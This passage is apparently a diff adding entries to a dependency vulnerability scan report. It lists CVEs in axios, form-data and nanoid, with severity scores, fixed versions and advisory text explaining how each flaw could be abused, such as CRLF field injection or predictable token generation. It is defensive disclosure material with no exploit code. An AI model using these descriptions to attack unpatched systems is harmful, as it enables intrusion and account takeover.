+            "https://access.redhat.com/errata/RHSA-2026:28964",
+            "https://access.redhat.com/errata/RHSA-2026:29082",
+            "https://access.redhat.com/errata/RHSA-2026:29197",
+            "https://access.redhat.com/errata/RHSA-2026:29800",
+            "https://access.redhat.com/errata/RHSA-2026:29864",
+            "https://access.redhat.com/errata/RHSA-2026:30650",
+            "https://access.redhat.com/errata/RHSA-2026:30651",
+            "https://access.redhat.com/errata/RHSA-2026:33005",
+            "https://access.redhat.com/errata/RHSA-2026:33155",
+            "https://access.redhat.com/errata/RHSA-2026:33160",
+            "https://access.redhat.com/errata/RHSA-2026:33163",
+            "https://access.redhat.com/errata/RHSA-2026:33173",
+            "https://access.redhat.com/errata/RHSA-2026:33183",
+            "https://access.redhat.com/errata/RHSA-2026:33574",
+            "https://access.redhat.com/errata/RHSA-2026:34525",
+            "https://access.redhat.com/errata/RHSA-2026:34527",
+            "https://access.redhat.com/errata/RHSA-2026:34530",
+            "https://access.redhat.com/errata/RHSA-2026:34794",
+            "https://access.redhat.com/errata/RHSA-2026:36108",
+            "https://access.redhat.com/errata/RHSA-2026:36611",
+            "https://access.redhat.com/errata/RHSA-2026:36754",
+            "https://access.redhat.com/errata/RHSA-2026:36820",
+            "https://access.redhat.com/errata/RHSA-2026:36882",
+            "https://access.redhat.com/errata/RHSA-2026:36883",
+            "https://access.redhat.com/errata/RHSA-2026:40262",
+            "https://access.redhat.com/errata/RHSA-2026:40792",
+            "https://access.redhat.com/errata/RHSA-2026:40795",
+            "https://access.redhat.com/errata/RHSA-2026:41031",
+            "https://access.redhat.com/errata/RHSA-2026:41055",
+            "https://access.redhat.com/errata/RHSA-2026:41064",
+            "https://access.redhat.com/errata/RHSA-2026:41066",
+            "https://access.redhat.com/errata/RHSA-2026:41928",
+            "https://access.redhat.com/errata/RHSA-2026:41951",
+            "https://access.redhat.com/errata/RHSA-2026:42078",
+            "https://access.redhat.com/errata/RHSA-2026:42085",
+            "https://access.redhat.com/errata/RHSA-2026:42142",
+            "https://access.redhat.com/errata/RHSA-2026:42146",
+            "https://access.redhat.com/errata/RHSA-2026:42796",
+            "https://access.redhat.com/errata/RHSA-2026:43052",
+            "https://access.redhat.com/errata/RHSA-2026:46885",
+            "https://access.redhat.com/errata/RHSA-2026:46903",
+            "https://access.redhat.com/errata/RHSA-2026:50300",
+            "https://access.redhat.com/errata/RHSA-2026:54188",
+            "https://access.redhat.com/errata/RHSA-2026:57191",
+            "https://access.redhat.com/errata/RHSA-2026:60520",
+            "https://access.redhat.com/errata/RHSA-2026:66488",
+            "https://access.redhat.com/errata/RHSA-2026:66545",
+            "https://access.redhat.com/security/cve/CVE-2026-44494",
+            "https://advisory.echohq.com/cve/CVE-2026-44494",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2487942",
+            "https://github.com/advisories/GHSA-35jp-ww65-95wh",
+            "https://github.com/advisories/GHSA-fvcv-3m26-pcqx",
+            "https://github.com/axios/axios",
+            "https://github.com/axios/axios/security/advisories/GHSA-35jp-ww65-95wh",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-44494",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-44494.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-44494"
+          ],
+          "PublishedDate": "2026-06-11T17:16:33.313Z",
+          "LastModifiedDate": "2026-09-11T13:18:07.983Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-44495",
+          "VendorIDs": [
+            "GHSA-3g43-6gmg-66jw"
+          ],
+          "PkgID": "axios@1.12.2",
+          "PkgName": "axios",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/axios@1.12.2",
+            "UID": "cdc2f09e371f2a70"
+          },
+          "InstalledVersion": "1.12.2",
+          "FixedVersion": "1.15.2, 0.31.1",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-44495",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:354beaff7aa2022a2efb9f226f342f4b56a151b55837776d84aa7258be524142",
+          "Title": "axios: Axios: Information disclosure due to prototype pollution vulnerability",
+          "Description": "Axios is a promise based HTTP client for the browser and Node.js. From 0.19.0 to before 0.31.1 and 1.15.2, Axios contains prototype-pollution gadgets in request config processing. If another vulnerability in the same JavaScript process has already polluted Object.prototype.transformResponse, affected Axios versions may treat that inherited value as request configuration or as an option validator. Axios does not itself create the prototype pollution. Exploitability requires a separate prototype-pollution vulnerability or equivalent attacker control over Object.prototype before Axios creates a request. This vulnerability is fixed in 0.31.1 and 1.15.2.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-94",
+            "CWE-1321",
+            "CWE-915"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "nvd": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:L",
+              "V3Score": 7
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:H",
+              "V3Score": 7.7
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:L",
+              "V3Score": 7
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:20889",
+            "https://access.redhat.com/errata/RHSA-2026:20938",
+            "https://access.redhat.com/errata/RHSA-2026:27044",
+            "https://access.redhat.com/errata/RHSA-2026:27063",
+            "https://access.redhat.com/errata/RHSA-2026:27944",
+            "https://access.redhat.com/errata/RHSA-2026:28964",
+            "https://access.redhat.com/errata/RHSA-2026:29082",
+            "https://access.redhat.com/errata/RHSA-2026:29197",
+            "https://access.redhat.com/errata/RHSA-2026:30650",
+            "https://access.redhat.com/errata/RHSA-2026:30651",
+            "https://access.redhat.com/errata/RHSA-2026:33155",
+            "https://access.redhat.com/errata/RHSA-2026:33160",
+            "https://access.redhat.com/errata/RHSA-2026:33163",
+            "https://access.redhat.com/errata/RHSA-2026:33173",
+            "https://access.redhat.com/errata/RHSA-2026:33183",
+            "https://access.redhat.com/errata/RHSA-2026:33574",
+            "https://access.redhat.com/errata/RHSA-2026:34160",
+            "https://access.redhat.com/errata/RHSA-2026:34374",
+            "https://access.redhat.com/errata/RHSA-2026:36108",
+            "https://access.redhat.com/errata/RHSA-2026:36611",
+            "https://access.redhat.com/errata/RHSA-2026:36754",
+            "https://access.redhat.com/errata/RHSA-2026:36820",
+            "https://access.redhat.com/errata/RHSA-2026:36882",
+            "https://access.redhat.com/errata/RHSA-2026:36883",
+            "https://access.redhat.com/errata/RHSA-2026:40262",
+            "https://access.redhat.com/errata/RHSA-2026:40768",
+            "https://access.redhat.com/errata/RHSA-2026:40792",
+            "https://access.redhat.com/errata/RHSA-2026:40795",
+            "https://access.redhat.com/errata/RHSA-2026:41031",
+            "https://access.redhat.com/errata/RHSA-2026:41055",
+            "https://access.redhat.com/errata/RHSA-2026:41064",
+            "https://access.redhat.com/errata/RHSA-2026:41066",
+            "https://access.redhat.com/errata/RHSA-2026:41928",
+            "https://access.redhat.com/errata/RHSA-2026:41951",
+            "https://access.redhat.com/errata/RHSA-2026:42078",
+            "https://access.redhat.com/errata/RHSA-2026:42142",
+            "https://access.redhat.com/errata/RHSA-2026:42146",
+            "https://access.redhat.com/errata/RHSA-2026:42796",
+            "https://access.redhat.com/errata/RHSA-2026:43052",
+            "https://access.redhat.com/errata/RHSA-2026:46885",
+            "https://access.redhat.com/errata/RHSA-2026:46903",
+            "https://access.redhat.com/errata/RHSA-2026:50300",
+            "https://access.redhat.com/errata/RHSA-2026:53840",
+            "https://access.redhat.com/errata/RHSA-2026:54188",
+            "https://access.redhat.com/errata/RHSA-2026:54555",
+            "https://access.redhat.com/errata/RHSA-2026:57191",
+            "https://access.redhat.com/errata/RHSA-2026:59833",
+            "https://access.redhat.com/errata/RHSA-2026:60520",
+            "https://access.redhat.com/errata/RHSA-2026:66545",
+            "https://access.redhat.com/security/cve/CVE-2026-44495",
+            "https://advisory.echohq.com/cve/CVE-2026-44495",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2487937",
+            "https://github.com/advisories/GHSA-3g43-6gmg-66jw",
+            "https://github.com/axios/axios",
+            "https://github.com/axios/axios/security/advisories/GHSA-3g43-6gmg-66jw",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-44495",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-44495.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-44495"
+          ],
+          "PublishedDate": "2026-06-11T17:16:33.45Z",
+          "LastModifiedDate": "2026-09-11T13:18:08.61Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-44496",
+          "VendorIDs": [
+            "GHSA-hfxv-24rg-xrqf"
+          ],
+          "PkgID": "axios@1.12.2",
+          "PkgName": "axios",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/axios@1.12.2",
+            "UID": "cdc2f09e371f2a70"
+          },
+          "InstalledVersion": "1.12.2",
+          "FixedVersion": "1.16.0, 0.32.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-44496",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:8959a653e796d4cd3bd102c885c82ddc2a9216d5640c411893aa2c7a2650590c",
+          "Title": "axios: Axios: Client-side Denial of Service via unescaped regex metacharacters in XSRF cookie name",
+          "Description": "Axios is a promise based HTTP client for the browser and Node.js. Axios versions before 0.32.0 on the 0.x line and before 1.16.0 on the 1.x line build a regular expression from the configured XSRF cookie name without escaping regex metacharacters. In standard browser environments, an attacker who can influence the cookie name passed to axios can cause expensive regex backtracking while axios reads document.cookie. The practical impact is client-side availability degradation, such as freezing the affected browser tab while axios prepares a request. The issue does not affect ordinary Node.js HTTP adapter usage, React Native, or web workers, where axios does not read document.cookie. This vulnerability is fixed in 0.32.0 and 1.16.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-400",
+            "CWE-1333"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:20889",
+            "https://access.redhat.com/errata/RHSA-2026:20938",
+            "https://access.redhat.com/errata/RHSA-2026:27044",
+            "https://access.redhat.com/errata/RHSA-2026:27063",
+            "https://access.redhat.com/errata/RHSA-2026:28571",
+            "https://access.redhat.com/errata/RHSA-2026:28964",
+            "https://access.redhat.com/errata/RHSA-2026:29082",
+            "https://access.redhat.com/errata/RHSA-2026:29197",
+            "https://access.redhat.com/errata/RHSA-2026:30076",
+            "https://access.redhat.com/errata/RHSA-2026:30650",
+            "https://access.redhat.com/errata/RHSA-2026:30651",
+            "https://access.redhat.com/errata/RHSA-2026:33155",
+            "https://access.redhat.com/errata/RHSA-2026:33160",
+            "https://access.redhat.com/errata/RHSA-2026:33163",
+            "https://access.redhat.com/errata/RHSA-2026:33173",
+            "https://access.redhat.com/errata/RHSA-2026:33183",
+            "https://access.redhat.com/errata/RHSA-2026:33574",
+            "https://access.redhat.com/errata/RHSA-2026:33683",
+            "https://access.redhat.com/errata/RHSA-2026:34766",
+            "https://access.redhat.com/errata/RHSA-2026:36611",
+            "https://access.redhat.com/errata/RHSA-2026:36754",
+            "https://access.redhat.com/errata/RHSA-2026:36820",
+            "https://access.redhat.com/errata/RHSA-2026:36882",
+            "https://access.redhat.com/errata/RHSA-2026:36883",
+            "https://access.redhat.com/errata/RHSA-2026:41055",
+            "https://access.redhat.com/errata/RHSA-2026:41064",
+            "https://access.redhat.com/errata/RHSA-2026:41066",
+            "https://access.redhat.com/errata/RHSA-2026:41928",
+            "https://access.redhat.com/errata/RHSA-2026:41951",
+            "https://access.redhat.com/errata/RHSA-2026:42078",
+            "https://access.redhat.com/errata/RHSA-2026:42085",
+            "https://access.redhat.com/errata/RHSA-2026:42142",
+            "https://access.redhat.com/errata/RHSA-2026:42796",
+            "https://access.redhat.com/errata/RHSA-2026:46885",
+            "https://access.redhat.com/errata/RHSA-2026:46903",
+            "https://access.redhat.com/errata/RHSA-2026:50300",
+            "https://access.redhat.com/errata/RHSA-2026:56789",
+            "https://access.redhat.com/errata/RHSA-2026:57191",
+            "https://access.redhat.com/errata/RHSA-2026:59360",
+            "https://access.redhat.com/errata/RHSA-2026:59833",
+            "https://access.redhat.com/errata/RHSA-2026:60520",
+            "https://access.redhat.com/errata/RHSA-2026:66488",
+            "https://access.redhat.com/errata/RHSA-2026:66545",
+            "https://access.redhat.com/security/cve/CVE-2026-44496",
+            "https://advisory.echohq.com/cve/CVE-2026-44496",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2487943",
+            "https://github.com/advisories/GHSA-hfxv-24rg-xrqf",
+            "https://github.com/axios/axios",
+            "https://github.com/axios/axios/releases/tag/v0.32.0",
+            "https://github.com/axios/axios/releases/tag/v1.16.0",
+            "https://github.com/axios/axios/security/advisories/GHSA-hfxv-24rg-xrqf",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-44496",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-44496.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-44496"
+          ],
+          "PublishedDate": "2026-06-11T17:16:33.59Z",
+          "LastModifiedDate": "2026-09-11T13:18:09.287Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-12143",
+          "VendorIDs": [
+            "GHSA-hmw2-7cc7-3qxx"
+          ],
+          "PkgID": "form-data@4.0.4",
+          "PkgName": "form-data",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/form-data@4.0.4",
+            "UID": "8dc2c0c7bacd373"
+          },
+          "InstalledVersion": "4.0.4",
+          "FixedVersion": "2.5.6, 3.0.5, 4.0.6",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-12143",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:50fd1eacb9fcf2248df23c44f35e91a12776c5d5c028c81150183cc92ebc8b8e",
+          "Title": "form-data: form-data: Form field override via CRLF injection",
+          "Description": "form-data is a library for creating readable multipart/form-data streams. In versions through 4.0.5, the `field` argument to `FormData#append` and the `filename` option are concatenated verbatim into the `Content-Disposition` header without escaping carriage return (CR), line feed (LF), or double-quote (\") characters. An application that passes attacker-controlled data as a field name or filename (for example, an API gateway that turns JSON object keys into multipart field names) allows the attacker to terminate the header line and inject additional headers, or to smuggle entire additional multipart parts, into the request the application forwards to a backend. This can let the attacker add or override form fields (e.g. set `is_admin=true`) seen by the downstream parser. This is an instance of CWE-93 (CRLF injection). The fix escapes CR, LF, and `\"` as `%0D`, `%0A`, and `%22` in field names and filenames, matching the serialization browsers use per the WHATWG HTML multipart/form-data encoding algorithm. Exploitation requires the consuming application to use untrusted input as a field name or filename; applications that use only fixed/trusted field names are not affected. Fixed in 2.5.6, 3.0.5, and 4.0.6.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-93"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N",
+              "V3Score": 7.5,
+              "V40Score": 8.7
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:33155",
+            "https://access.redhat.com/errata/RHSA-2026:33160",
+            "https://access.redhat.com/errata/RHSA-2026:33163",
+            "https://access.redhat.com/errata/RHSA-2026:33173",
+            "https://access.redhat.com/errata/RHSA-2026:33183",
+            "https://access.redhat.com/errata/RHSA-2026:34342",
+            "https://access.redhat.com/errata/RHSA-2026:36319",
+            "https://access.redhat.com/errata/RHSA-2026:36625",
+            "https://access.redhat.com/errata/RHSA-2026:36754",
+            "https://access.redhat.com/errata/RHSA-2026:40262",
+            "https://access.redhat.com/errata/RHSA-2026:41031",
+            "https://access.redhat.com/errata/RHSA-2026:41066",
+            "https://access.redhat.com/errata/RHSA-2026:41928",
+            "https://access.redhat.com/errata/RHSA-2026:41929",
+            "https://access.redhat.com/errata/RHSA-2026:41951",
+            "https://access.redhat.com/errata/RHSA-2026:42146",
+            "https://access.redhat.com/errata/RHSA-2026:42796",
+            "https://access.redhat.com/errata/RHSA-2026:43052",
+            "https://access.redhat.com/errata/RHSA-2026:44263",
+            "https://access.redhat.com/errata/RHSA-2026:44267",
+            "https://access.redhat.com/errata/RHSA-2026:48124",
+            "https://access.redhat.com/errata/RHSA-2026:48151",
+            "https://access.redhat.com/errata/RHSA-2026:48693",
+            "https://access.redhat.com/errata/RHSA-2026:50300",
+            "https://access.redhat.com/errata/RHSA-2026:54770",
+            "https://access.redhat.com/errata/RHSA-2026:56338",
+            "https://access.redhat.com/errata/RHSA-2026:56366",
+            "https://access.redhat.com/errata/RHSA-2026:56431",
+            "https://access.redhat.com/errata/RHSA-2026:57013",
+            "https://access.redhat.com/errata/RHSA-2026:57545",
+            "https://access.redhat.com/errata/RHSA-2026:57590",
+            "https://access.redhat.com/errata/RHSA-2026:57801",
+            "https://access.redhat.com/errata/RHSA-2026:59136",
+            "https://access.redhat.com/errata/RHSA-2026:59153",
+            "https://access.redhat.com/errata/RHSA-2026:59155",
+            "https://access.redhat.com/errata/RHSA-2026:59556",
+            "https://access.redhat.com/errata/RHSA-2026:59557",
+            "https://access.redhat.com/errata/RHSA-2026:59558",
+            "https://access.redhat.com/errata/RHSA-2026:59559",
+            "https://access.redhat.com/errata/RHSA-2026:59579",
+            "https://access.redhat.com/errata/RHSA-2026:60387",
+            "https://access.redhat.com/errata/RHSA-2026:60388",
+            "https://access.redhat.com/errata/RHSA-2026:60389",
+            "https://access.redhat.com/errata/RHSA-2026:60390",
+            "https://access.redhat.com/errata/RHSA-2026:60391",
+            "https://access.redhat.com/errata/RHSA-2026:60446",
+            "https://access.redhat.com/errata/RHSA-2026:60477",
+            "https://access.redhat.com/errata/RHSA-2026:60520",
+            "https://access.redhat.com/errata/RHSA-2026:62260",
+            "https://access.redhat.com/errata/RHSA-2026:63047",
+            "https://access.redhat.com/errata/RHSA-2026:63355",
+            "https://access.redhat.com/errata/RHSA-2026:63373",
+            "https://access.redhat.com/errata/RHSA-2026:66003",
+            "https://access.redhat.com/errata/RHSA-2026:66488",
+            "https://access.redhat.com/errata/RHSA-2026:66545",
+            "https://access.redhat.com/security/cve/CVE-2026-12143",
+            "https://advisory.echohq.com/cve/CVE-2026-12143",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2488480",
+            "https://cwe.mitre.org/data/definitions/93.html",
+            "https://github.com/advisories/GHSA-hmw2-7cc7-3qxx",
+            "https://github.com/form-data/form-data",
+            "https://github.com/form-data/form-data/commit/64190db548c0179e37206858e39f27cf513e9435",
+            "https://github.com/form-data/form-data/commit/be3f3cf553978bac15a5182f1f3c3d2d38ccf229",
+            "https://github.com/form-data/form-data/commit/c7133499c2ee1b80c678e411244f4442bf902045",
+            "https://github.com/form-data/form-data/security/advisories/GHSA-hmw2-7cc7-3qxx",
+            "https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#multipart-form-data",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-12143",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-12143.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-12143",
+            "https://www.npmjs.com/package/form-data"
+          ],
+          "PublishedDate": "2026-06-12T19:16:26.56Z",
+          "LastModifiedDate": "2026-09-11T13:17:04.787Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-67213",
+          "VendorIDs": [
+            "GHSA-2v37-7h3g-55p8"
+          ],
+          "PkgID": "nanoid@3.3.11",
+          "PkgName": "nanoid",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/nanoid@3.3.11",
+            "UID": "6813aec6c5ee2539"
+          },
+          "InstalledVersion": "3.3.11",
+          "FixedVersion": "3.3.18, 5.1.6",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-67213",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:71847ecaa0e7299c89f4b402d7e9f67bedd083ed6bed0e0c8bc1645ccd3556e6",
+          "Title": "nanoid: nanoid: Denial of Service via infinite loop in random ID generation",
+          "Description": "nanoid (Nano ID) before 5.1.6 contains an infinite loop in the customAlphabet and customRandom functions. When these functions are configured with a size of 0, the internal generation loop never satisfies its exit condition and spins indefinitely, hanging the calling thread. An application that passes an unvalidated, attacker-controlled size of 0 to these functions is exposed to a denial-of-service condition.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-835"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "nvd": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+              "V3Score": 5.9,
+              "V40Score": 8.2
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-67213",
+            "https://advisory.echohq.com/cve/CVE-2026-67213",
+            "https://github.com/ai/nanoid",
+            "https://github.com/ai/nanoid/commit/cb3626d0f3342fdf179cd425fd9c4fbb92c7d0e7",
+            "https://github.com/ai/nanoid/commit/e10f8d40ce9d1ab47f66d65a16b48086432730d0",
+            "https://github.com/ai/nanoid/commit/f9d13f150847d117877adee3460a46eceb0cf49b",
+            "https://github.com/ai/nanoid/releases/tag/3.3.17",
+            "https://github.com/ai/nanoid/releases/tag/3.3.18",
+            "https://github.com/ai/nanoid/releases/tag/5.1.6",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-67213",
+            "https://www.cve.org/CVERecord?id=CVE-2026-67213",
+            "https://www.vulncheck.com/advisories/nanoid-before-infinite-loop-via-zero-size-in-customalphabet-and-customrandom"
+          ],
+          "PublishedDate": "2026-07-29T14:16:34.89Z",
+          "LastModifiedDate": "2026-10-23T23:10:00.157Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-67214",
+          "VendorIDs": [
+            "GHSA-28wg-ghj8-5hjv"
+          ],
+          "PkgID": "nanoid@3.3.11",
+          "PkgName": "nanoid",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/nanoid@3.3.11",
+            "UID": "6813aec6c5ee2539"
+          },
+          "InstalledVersion": "3.3.11",
+          "FixedVersion": "3.3.16, 5.1.16",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-67214",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:888dad3465957bc9e6a0a4cb510cdd8a9d95b6b78bcbb8af81e4fb228a708c19",
+          "Title": "nanoid: nanoid: Denial of Service via negative size input in non-secure module functions",
+          "Description": "nanoid (Nano ID) before 3.3.16 and 5.1.16 contains an infinite loop in the customAlphabet and nanoid functions of its non-secure module (nanoid/non-secure). When these functions are given a negative size, the loop counter is decremented from a negative value and never reaches its termination condition, spinning indefinitely and hanging the calling thread. An application that passes an unvalidated, attacker-controlled negative size to these functions is exposed to a denial-of-service condition.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-835"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "nvd": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+              "V3Score": 5.9,
+              "V40Score": 8.2
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-67214",
+            "https://advisory.echohq.com/cve/CVE-2026-67214",
+            "https://github.com/ai/nanoid",
+            "https://github.com/ai/nanoid/commit/6ccc67bbaba71d3d77a21d9b636f4171a268ce49",
+            "https://github.com/ai/nanoid/commit/e835c9b71eab832bc6106944bdd26ea96cf2c66d",
+            "https://github.com/ai/nanoid/pull/600",
+            "https://github.com/ai/nanoid/pull/601",
+            "https://github.com/ai/nanoid/releases/tag/3.3.16",
+            "https://github.com/ai/nanoid/releases/tag/5.1.16",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-67214",
+            "https://www.cve.org/CVERecord?id=CVE-2026-67214",
+            "https://www.vulncheck.com/advisories/nanoid-before-infinite-loop-via-negative-size-in-non-secure-module"
+          ],
+          "PublishedDate": "2026-07-29T14:16:35.043Z",
+          "LastModifiedDate": "2026-10-23T23:10:00.157Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-73086",
+          "VendorIDs": [
+            "GHSA-xwg4-73v4-xw9w"
+          ],
+          "PkgID": "nanoid@3.3.11",
+          "PkgName": "nanoid",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/nanoid@3.3.11",
+            "UID": "6813aec6c5ee2539"
+          },
+          "InstalledVersion": "3.3.11",
+          "FixedVersion": "3.3.12, 5.1.11",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-73086",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:afda7646267c2ba49f929a2b0860c6d2dd6925d2adee29d264def1060ac9fcca",
+          "Title": "nanoid: nanoid: Predictable ID generation due to integer overflow",
+          "Description": "nanoid is a secure, URL-friendly, unique string ID generator for JavaScript. Prior to versions 3.3.12 and 5.1.11, the nanoid(size) function in index.js and index.cjs coerces the user-influenced size parameter to a signed 32-bit integer, allowing a value of 2147483648 to become -2147483648 and corrupt the process-wide CSPRNG poolOffset in fillPool(), which causes subsequent session tokens, CSRF tokens, API keys, and unique identifiers to become the deterministic string \"uuuuuuuuuuuuuuuuuuuuu\" until the process restarts. This issue is fixed in versions 3.3.12 and 5.1.11.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-190"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.4
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.4
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-73086",
+            "https://advisory.echohq.com/cve/CVE-2026-73086",
+            "https://github.com/advisories/GHSA-xwg4-73v4-xw9w",
+            "https://github.com/ai/nanoid",
+            "https://github.com/ai/nanoid/commit/7087969281cab8ba8ae3babf1894e819068b3bb4",
+            "https://github.com/ai/nanoid/commit/821dfed7b5db7f88e92f56c60eef32c8135077c3",
+            "https://github.com/ai/nanoid/commit/b0036ed60dc9facd7f1191a50dfb3076500202ac",
+            "https://github.com/ai/nanoid/releases/tag/3.3.12",
+            "https://github.com/ai/nanoid/releases/tag/5.1.11",
+            "https://github.com/ai/nanoid/security/advisories/GHSA-xwg4-73v4-xw9w",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-73086",
+            "https://www.cve.org/CVERecord?id=CVE-2026-73086"
+          ],
